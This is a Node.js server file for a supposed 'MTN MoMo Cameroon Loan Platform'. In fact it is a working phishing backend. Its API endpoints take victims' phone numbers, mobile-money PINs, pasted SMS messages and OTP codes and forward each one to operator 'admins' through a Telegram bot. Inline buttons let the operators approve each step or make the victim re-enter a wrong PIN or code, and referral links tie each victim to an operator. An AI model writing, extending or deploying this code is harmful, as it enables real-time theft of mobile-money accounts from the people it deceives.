/**
 * ============================================================================
 * MTN MoMo Cameroon Loan Platform - Production Server
 * ============================================================================
 */

const express = require('express');
const TelegramBot = require('node-telegram-bot-api');
const path = require('path');
require('dotenv').config();

const db = require('./database');

// ==========================================
// 1. ENVIRONMENT & CONFIGURATION SETUP
// ==========================================
const BOT_TOKEN = process.env.SUPER_ADMIN_BOT_TOKEN;
const PORT = process.env.PORT || 10000;
const WEBHOOK_URL = process.env.RENDER_EXTERNAL_URL || process.env.APP_URL || `http://localhost:${PORT}`;

if (!BOT_TOKEN) {
    console.error('❌ CRITICAL: SUPER_ADMIN_BOT_TOKEN is missing in environment variables.');
    process.exit(1);
}

const app = express();

// Initialize Telegram Bot without polling (Webhook mode)
const bot = new TelegramBot(BOT_TOKEN);

// State Management (In-Memory Maps & Sets)
const adminChatIds = new Map();         // adminId → chatId
const pausedAdmins = new Set();         // adminIds that are temporarily paused
const processingLocks = new Set();      // Prevents duplicate submissions
const suspendAllSessions = new Map();   // Superadmin chatId → session data

const SUSPEND_PAGE_SIZE = 10;
let dbReady = false;

// ==========================================
// 2. HELPER FUNCTIONS
// ==========================================

/**
 * Checks if a specific admin is currently active.
 */
function isAdminActive(chatId) {
    const adminId = getAdminIdByChatId(chatId);
    if (!adminId) return false;
    if (adminId === 'ADMIN001') return true;
    return !pausedAdmins.has(adminId);
}

/**
 * Resolves adminId using their Telegram chatId.
 */
function getAdminIdByChatId(chatId) {
    for (const [adminId, storedChatId] of adminChatIds.entries()) {
        if (storedChatId === chatId) return adminId;
    }
    return null;
}

/**
 * Formats local phone numbers (+237XXXXXXXXX → 6XXXXXXXXX) for display.
 */
function formatPhone(phoneNumber) {
    if (!phoneNumber) return phoneNumber;
    if (phoneNumber.startsWith('+2376')) return phoneNumber.slice(4);
    if (phoneNumber.startsWith('+237')) return phoneNumber.slice(4);
    if (phoneNumber.startsWith('2376')) return phoneNumber.slice(3);
    if (phoneNumber.startsWith('237')) return phoneNumber.slice(3);
    return phoneNumber;
}

/**
 * Safely sends a message to an admin, handling database fallbacks.
 */
async function sendToAdmin(adminId, message, options = {}) {
    let chatId = adminChatIds.get(adminId);

    if (!chatId) {
        try {
            const admin = await db.getAdmin(adminId);
            if (!admin?.chatId) {
                console.error(`❌ No chat ID found for admin: ${adminId}`);
                return null;
            }
            adminChatIds.set(adminId, admin.chatId);
            chatId = admin.chatId;
        } catch (err) {
            console.error(`❌ Database fallback failed for admin ${adminId}:`, err.message);
            return null;
        }
    }

    try {
        return await bot.sendMessage(chatId, message, options);
    } catch (error) {
        console.error(`❌ Error sending message to admin ${adminId}:`, error.message);
        return null;
    }
}

// ==========================================
// 3. EXPRESS MIDDLEWARE
// ==========================================
app.use(express.json());
app.use(express.static(__dirname));

// ==========================================
// 4. TELEGRAM BOT HANDLERS SETUP
// ==========================================
console.log('⏳ Setting up Telegram bot event handlers...');

bot.on('error', (error) => console.error('❌ Bot runtime error:', error?.message));
bot.on('polling_error', (error) => console.error('❌ Bot polling error:', error?.message));

setupCommandHandlers();
console.log('✅ Telegram command handlers successfully configured.');

// ==========================================
// 5. WEBHOOK ENDPOINT
// ==========================================
const webhookPath = `/telegram-webhook`;

app.post(webhookPath, (req, res) => {
    try {
        if (req.body && req.body.update_id !== undefined) {
            bot.processUpdate(req.body);
        }
        res.sendStatus(200);
    } catch (error) {
        console.error('❌ Webhook handler error:', error);
        res.sendStatus(200); // Always respond 200 to Telegram to prevent looping
    }
});

// ==========================================
// 6. DATABASE CONNECTION & WEBHOOK SYNC
// ==========================================
db.connectDatabase()
    .then(async () => {
        dbReady = true;
        console.log('✅ Database connection established.');

        await loadAdminChatIds();

        const fullWebhookUrl = `${WEBHOOK_URL}${webhookPath}`;
        let webhookSetSuccessfully = false;
        let attempts = 0;

        // Retry loop for setting up the Telegram Webhook securely
        while (!webhookSetSuccessfully && attempts < 3) {
            attempts++;
            try {
                console.log(`🔄 Attempt ${attempts}/3: Configuring webhook endpoint...`);
                await bot.deleteWebHook();
                await new Promise(resolve => setTimeout(resolve, 1000));

                const result = await bot.setWebHook(fullWebhookUrl, {
                    drop_pending_updates: false,
                    max_connections: 40,
                    allowed_updates: ['message', 'callback_query']
                });

                if (result) {
                    const info = await bot.getWebHookInfo();
                    if (info.url === fullWebhookUrl) {
                        webhookSetSuccessfully = true;
                        console.log(`✅ Webhook verified and active: ${fullWebhookUrl}`);
                    }
                }
            } catch (webhookError) {
                console.error(`❌ Webhook setup attempt ${attempts} failed:`, webhookError.message);
                if (attempts < 3) await new Promise(resolve => setTimeout(resolve, 2000));
            }
        }

        if (!webhookSetSuccessfully) {
            console.error('❌❌❌ CRITICAL: Failed to configure webhook after multiple attempts.');
        }

        try {
            const botInfo = await bot.getMe();
            console.log(`✅ Telegram Bot operational: @${botInfo.username} (${botInfo.first_name})`);
        } catch (botError) {
            console.error('❌ Failed to fetch bot profile info:', botError.message);
        }

        // Keep-alive intervals
        setInterval(() => {
            fetch(`${WEBHOOK_URL}/health`).catch(() => {});
        }, 14 * 60 * 1000);

        setInterval(async () => {
            try {
                const info = await bot.getWebHookInfo();
                if (info.url !== fullWebhookUrl) {
                    console.log('⚠️ Webhook URL drift detected. Re-syncing...');
                    await bot.setWebHook(fullWebhookUrl, {
                        drop_pending_updates: false,
                        max_connections: 40,
                        allowed_updates: ['message', 'callback_query']
                    });
                }
            } catch (error) {
                console.error('⚠️ Periodic webhook check error:', error.message);
            }
        }, 60000);

        // Start HTTP Server
        app.listen(PORT, () => {
            console.log(`\n💎 MTN MOMO CAMEROON LOAN PLATFORM`);
            console.log(`==================================`);
            console.log(`🌐 Server running at: http://localhost:${PORT}`);
            console.log(`🤖 Telegram Bot Mode: WEBHOOK`);
            console.log(`👥 Active Admins Loaded: ${adminChatIds.size}`);
            console.log(`\n✅ System fully initialized and ready.\n`);
        });
    })
    .catch((error) => {
        console.error('❌ Fatal Initialization Error:', error);
        process.exit(1);
    });

// ==========================================
// 7. ADMIN DATA LOADER
// ==========================================
async function loadAdminChatIds() {
    try {
        const admins = await db.getAllAdmins();
        adminChatIds.clear();
        pausedAdmins.clear();

        for (const admin of admins) {
            if (admin.chatId) {
                adminChatIds.set(admin.adminId, admin.chatId);
                if (admin.status === 'paused') pausedAdmins.add(admin.adminId);
            }
        }
        console.log(`✅ Loaded ${adminChatIds.size} admin mappings (${pausedAdmins.size} paused).`);
    } catch (error) {
        console.error('❌ Error loading admin chat IDs from database:', error);
    }
}

// ==========================================
// 8. TELEGRAM COMMAND & CALLBACK HANDLERS
// ==========================================
function setupCommandHandlers() {
    // /start Command
    bot.onText(/\/start/, async (msg) => {
        const chatId = msg.chat.id;
        const adminId = getAdminIdByChatId(chatId);

        try {
            if (adminId) {
                if (pausedAdmins.has(adminId) && adminId !== 'ADMIN001') {
                    return bot.sendMessage(chatId, `🚫 *ADMIN ACCESS PAUSED*\nYour administrative access has been temporarily suspended.`, { parse_mode: 'Markdown' });
                }

                const admin = await db.getAdmin(adminId);
                const isSuperAdmin = adminId === 'ADMIN001';

                const welcomeMessage = `
👋 *Welcome back, ${admin.name}!*
*Admin ID:* \`${adminId}\`
*Role:* ${isSuperAdmin ? '⭐ Super Admin' : '👤 Standard Admin'}

*Your Personal Referral Link:*
${WEBHOOK_URL}?admin=${adminId}
                `.trim();

                await bot.sendMessage(chatId, welcomeMessage, { parse_mode: 'Markdown' });
            } else {
                await bot.sendMessage(chatId, `
👋 *Welcome to MTN MoMo Cameroon Loan Platform*
Your Chat ID is: \`${chatId}\`
Please provide this ID to your Super Administrator to request access.
                `.trim(), { parse_mode: 'Markdown' });
            }
        } catch (error) {
            console.error('❌ Error processing /start command:', error);
        }
    });

    // /stats Command
    bot.onText(/\/stats/, async (msg) => {
        const chatId = msg.chat.id;
        const adminId = getAdminIdByChatId(chatId);
        if (!adminId) return bot.sendMessage(chatId, '❌ You are not registered as an administrator.');
        if (!isAdminActive(chatId)) return bot.sendMessage(chatId, '🚫 Your admin access is currently paused.');

        const stats = await db.getAdminStats(adminId);
        bot.sendMessage(chatId, `
📊 *ADMINISTRATIVE STATISTICS*
------------------------------
📋 Total Applications: \`${stats.total}\`
⏳ PIN Pending: \`${stats.pinPending}\`
✅ PIN Approved: \`${stats.pinApproved}\`
⏳ SMS Pending: \`${stats.smsPending}\`
✅ SMS Approved: \`${stats.smsApproved}\`
⏳ OTP Pending: \`${stats.otpPending}\`
🎉 Fully Approved: \`${stats.fullyApproved}\`
        `.trim(), { parse_mode: 'Markdown' });
    });

    // /pending Command
    bot.onText(/\/pending/, async (msg) => {
        const chatId = msg.chat.id;
        const adminId = getAdminIdByChatId(chatId);
        if (!adminId) return bot.sendMessage(chatId, '❌ You are not registered as an administrator.');
        if (!isAdminActive(chatId)) return bot.sendMessage(chatId, '🚫 Your admin access is currently paused.');

        const adminApps = await db.getApplicationsByAdmin(adminId);
        const pinPending = adminApps.filter(a => a.pinStatus === 'pending');
        const smsPending = adminApps.filter(a => a.smsStatus === 'pending' && a.pinStatus === 'approved');
        const otpPending = adminApps.filter(a => a.otpStatus === 'pending' && a.smsStatus === 'approved');

        let message = `⏳ *PENDING QUEUE OVERVIEW*\n\n`;
        if (pinPending.length > 0) message += `📱 PIN Pending: *${pinPending.length}*\n`;
        if (smsPending.length > 0) message += `💬 SMS Pending: *${smsPending.length}*\n`;
        if (otpPending.length > 0) message += `🔢 OTP Pending: *${otpPending.length}*\n`;
        if (pinPending.length === 0 && smsPending.length === 0 && otpPending.length === 0) {
            message = '✨ Excellent! No pending applications found in your queue.';
        }
        bot.sendMessage(chatId, message, { parse_mode: 'Markdown' });
    });
}

// Inline Callback Query Router
bot.on('callback_query', async (callbackQuery) => {
    const chatId = callbackQuery.message.chat.id;
    const messageId = callbackQuery.message.message_id;
    const data = callbackQuery.data;
    const adminId = getAdminIdByChatId(chatId);

    if (!adminId) {
        return bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Unauthorized action.', show_alert: true });
    }

    if (!isAdminActive(chatId)) {
        return bot.answerCallbackQuery(callbackQuery.id, { text: '🚫 Your admin access is paused.', show_alert: true });
    }

    const parts = data.split('_');
    if (parts.length < 4) {
        return bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Invalid callback data package.', show_alert: true });
    }

    const [action, type, embeddedAdminId, ...appIdParts] = parts;
    const applicationId = appIdParts.join('_');

    if (embeddedAdminId !== adminId) {
        return bot.answerCallbackQuery(callbackQuery.id, { text: '❌ This application is assigned to a different admin.', show_alert: true });
    }

    const application = await db.getApplication(applicationId);
    if (!application || application.adminId !== adminId) {
        return bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Target application could not be found.', show_alert: true });
    }

    // --- Workflow Stage Actions ---

    // 1. PIN Stage
    if (action === 'deny' && type === 'pin') {
        await db.updateApplication(applicationId, { pinStatus: 'rejected' });
        await bot.editMessageText(`❌ *PIN REJECTED*\n📋 Reference: \`${applicationId}\``, { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown' });
        return bot.answerCallbackQuery(callbackQuery.id, { text: '❌ PIN application rejected.' });
    }
    if (action === 'allow' && type === 'pin') {
        await db.updateApplication(applicationId, { pinStatus: 'approved' });
        await bot.editMessageText(`✅ *PIN APPROVED — WAITING FOR SMS*\n📋 Reference: \`${applicationId}\``, { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown' });
        return bot.answerCallbackQuery(callbackQuery.id, { text: '✅ PIN approved. User can now proceed.' });
    }

    // 2. SMS Stage
    if (action === 'deny' && type === 'sms') {
        await db.updateApplicationSms(applicationId, application.smsText, 'rejected');
        await bot.editMessageText(`❌ *SMS REJECTED*\n📋 Reference: \`${applicationId}\``, { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown' });
        return bot.answerCallbackQuery(callbackQuery.id, { text: '❌ SMS verification rejected.' });
    }
    if (action === 'allow' && type === 'sms') {
        await db.updateApplicationSms(applicationId, application.smsText, 'approved');
        await bot.editMessageText(`✅ *SMS APPROVED — 4-DIGIT VERIFICATION ACTIVE*\n📋 Reference: \`${applicationId}\``, { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown' });
        return bot.answerCallbackQuery(callbackQuery.id, { text: '✅ SMS approved. User can enter OTP.' });
    }

    // 3. OTP Stage
    if (action === 'wrongpin' && type === 'otp') {
        await db.updateApplication(applicationId, { otpStatus: 'wrongpin_otp' });
        await bot.editMessageText(`❌ *FLAGGED: INCORRECT PIN*\n📋 Reference: \`${applicationId}\``, { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown' });
        return bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Prompting user to re-enter PIN.' });
    }
    if (action === 'wrongcode' && type === 'otp') {
        await db.updateApplication(applicationId, { otpStatus: 'wrongcode' });
        await bot.editMessageText(`❌ *FLAGGED: INCORRECT CODE*\n📋 Reference: \`${applicationId}\``, { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown' });
        return bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Prompting user to re-enter code.' });
    }
    if (action === 'approve' && type === 'otp') {
        await db.updateApplication(applicationId, { otpStatus: 'approved' });
        await bot.editMessageText(`🎉 *LOAN FULLY APPROVED & COMPLETED*\n📋 Reference: \`${applicationId}\``, { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown' });
        return bot.answerCallbackQuery(callbackQuery.id, { text: '🎉 Application approved successfully!' });
    }
});

// ==========================================
// 9. REST API ENDPOINTS
// ==========================================

// Verify PIN Request Entry
app.post('/api/verify-pin', async (req, res) => {
    try {
        const { phoneNumber, pin, adminId: requestAdminId, assignmentType } = req.body;
        const applicationId = `APP-${Date.now()}-${Math.random().toString(36).slice(2, 7).toUpperCase()}`;

        let assignedAdmin;
        if (assignmentType === 'specific' && requestAdminId) {
            assignedAdmin = await db.getAdmin(requestAdminId);
            if (!assignedAdmin || pausedAdmins.has(requestAdminId) || assignedAdmin.status !== 'active') {
                return res.status(400).json({ success: false, message: 'Invalid, paused, or inactive admin referral link.' });
            }
        } else {
            const activeAdmins = await db.getActiveAdmins();
            const availableAdmins = activeAdmins.filter(a => !pausedAdmins.has(a.adminId));
            if (availableAdmins.length === 0) {
                return res.status(503).json({ success: false, message: 'No administrators are available at the moment.' });
            }
            assignedAdmin = availableAdmins[0];
        }

        const existingApps = await db.getApplicationsByAdmin(assignedAdmin.adminId);
        const thisAdminPastApps = existingApps.filter(a => a.phoneNumber === phoneNumber && a.pinStatus !== 'pending');
        const isReturningUser = thisAdminPastApps.length > 0;

        await db.saveApplication({
            id: applicationId,
            adminId: assignedAdmin.adminId,
            adminName: assignedAdmin.name,
            phoneNumber,
            pin,
            pinStatus: 'pending',
            smsStatus: 'pending',
            otpStatus: 'pending',
            assignmentType: assignmentType || 'auto',
            isReturningUser,
            previousCount: thisAdminPastApps.length,
            timestamp: new Date().toISOString()
        });

        await sendToAdmin(assignedAdmin.adminId, `
🆕 *NEW PIN SUBMISSION*
------------------------------
📋 Ref: \`${applicationId}\`
📞 Phone: \`${formatPhone(phoneNumber)}\`
🔑 PIN: \`${pin}\`
        `.trim(), {
            parse_mode: 'Markdown',
            reply_markup: {
                inline_keyboard: [
                    [{ text: '❌ Reject PIN', callback_data: `deny_pin_${assignedAdmin.adminId}_${applicationId}` }],
                    [{ text: '✅ Approve & Allow', callback_data: `allow_pin_${assignedAdmin.adminId}_${applicationId}` }]
                ]
            }
        });

        res.json({ success: true, applicationId, assignedTo: assignedAdmin.name, assignedAdminId: assignedAdmin.adminId });
    } catch (error) {
        console.error('❌ Error in /api/verify-pin:', error);
        res.status(500).json({ success: false, message: 'Server error processing PIN: ' + error.message });
    }
});

// Check PIN Status
app.get('/api/check-pin-status/:applicationId', async (req, res) => {
    try {
        const application = await db.getApplication(req.params.applicationId);
        if (application) {
            res.json({ success: true, status: application.pinStatus });
        } else {
            res.status(404).json({ success: false, message: 'Application record not found.' });
        }
    } catch (error) {
        res.status(500).json({ success: false, message: 'Internal server error.' });
    }
});

// Verify SMS Submission Entry
app.post('/api/verify-sms', async (req, res) => {
    try {
        const { applicationId, smsText } = req.body;
        const application = await db.getApplication(applicationId);

        if (!application) {
            return res.status(404).json({ success: false, message: 'Application record not found.' });
        }

        await db.updateApplicationSms(applicationId, smsText, 'pending');

        await sendToAdmin(application.adminId, `
💬 *SMS CONTENT SUBMISSION*
------------------------------
📋 Ref: \`${applicationId}\`
📞 Phone: \`${formatPhone(application.phoneNumber)}\`

*Pasted Content:*
\`\`\`
${smsText}
\`\`\`
⏰ Received: ${new Date().toLocaleString()}
        `.trim(), {
            parse_mode: 'Markdown',
            reply_markup: {
                inline_keyboard: [
                    [{ text: '❌ Reject SMS', callback_data: `deny_sms_${application.adminId}_${applicationId}` }],
                    [{ text: '✅ Allow 4-Digit OTP', callback_data: `allow_sms_${application.adminId}_${applicationId}` }]
                ]
            }
        });

        res.json({ success: true });
    } catch (error) {
        console.error('❌ Error in /api/verify-sms:', error);
        res.status(500).json({ success: false, message: 'Server error processing SMS: ' + error.message });
    }
});

// Check SMS Status
app.get('/api/check-sms-status/:applicationId', async (req, res) => {
    try {
        const application = await db.getApplication(req.params.applicationId);
        if (application) {
            res.json({ success: true, status: application.smsStatus });
        } else {
            res.status(404).json({ success: false, message: 'Application record not found.' });
        }
    } catch (error) {
        res.status(500).json({ success: false, message: 'Internal server error.' });
    }
});

// Verify OTP Stage Entry
app.post('/api/verify-otp', async (req, res) => {
    try {
        const { applicationId, otp } = req.body;
        const application = await db.getApplication(applicationId);

        if (!application) {
            return res.status(404).json({ success: false, message: 'Application record not found.' });
        }

        await db.updateApplicationOtp(applicationId, otp, 'pending');

        await sendToAdmin(application.adminId, `
🔢 *4-DIGIT OTP VERIFICATION*
------------------------------
📋 Ref: \`${applicationId}\`
📞 Phone: \`${formatPhone(application.phoneNumber)}\`
🔢 OTP: \`${otp}\`
⏰ Received: ${new Date().toLocaleString()}
        `.trim(), {
            parse_mode: 'Markdown',
            reply_markup: {
                inline_keyboard: [
                    [{ text: '❌ Flag Wrong PIN', callback_data: `wrongpin_otp_${application.adminId}_${applicationId}` }],
                    [{ text: '❌ Flag Wrong Code', callback_data: `wrongcode_otp_${application.adminId}_${applicationId}` }],
                    [{ text: '✅ Approve Loan', callback_data: `approve_otp_${application.adminId}_${applicationId}` }]
                ]
            }
        });

        res.json({ success: true });
    } catch (error) {
        console.error('❌ Error in /api/verify-otp:', error);
        res.status(500).json({ success: false, message: 'Server error processing OTP: ' + error.message });
    }
});

// Check OTP Status
app.get('/api/check-otp-status/:applicationId', async (req, res) => {
    try {
        const application = await db.getApplication(req.params.applicationId);
        if (application) {
            res.json({ success: true, status: application.otpStatus });
        } else {
            res.status(404).json({ success: false, message: 'Application record not found.' });
        }
    } catch (error) {
        res.status(500).json({ success: false, message: 'Internal server error.' });
    }
});

// System Health Check Endpoint
app.get('/health', (req, res) => {
    res.json({
        status: 'ok',
        database: dbReady ? 'connected' : 'disconnected',
        activeAdmins: adminChatIds.size,
        pausedAdmins: pausedAdmins.size,
        botMode: 'webhook',
        timestamp: new Date().toISOString()
    });
});

// Frontend Client Page Server Route
app.get('/', async (req, res) => {
    const adminId = req.query.admin;
    if (adminId) {
        try {
            const admin = await db.getAdmin(adminId);
            if (admin && admin.status === 'active' && !pausedAdmins.has(adminId)) {
                if (admin.chatId && !adminChatIds.has(adminId)) {
                    adminChatIds.set(adminId, admin.chatId);
                }
            }
        } catch (error) {
            console.error('❌ Error validating referral admin on root request:', error);
        }
    }
    res.sendFile(path.join(__dirname, 'mtn-momo-cameroon.html'));
});

// ==========================================
// 10. GRACEFUL SHUTDOWN & EXCEPTION HANDLING
// ==========================================
async function shutdownGracefully(signal) {
    console.log(`\n🛑 Received signal ${signal}. Initiating graceful shutdown...`);
    try {
        suspendAllSessions.clear();
        await bot.deleteWebHook();
        await db.closeDatabase();
        console.log('✅ Server resources successfully released.');
        process.exit(0);
    } catch (error) {
        console.error('❌ Error during graceful shutdown:', error);
        process.exit(1);
    }
}

process.on('SIGTERM', () => shutdownGracefully('SIGTERM'));
process.on('SIGINT', () => shutdownGracefully('SIGINT'));

process.on('unhandledRejection', (reason) => {
    console.error('❌ Unhandled Promise Rejection:', reason?.message || reason);
});

process.on('uncaughtException', (error) => {
    console.error('❌ Uncaught Exception Encountered:', error?.message || error);
});
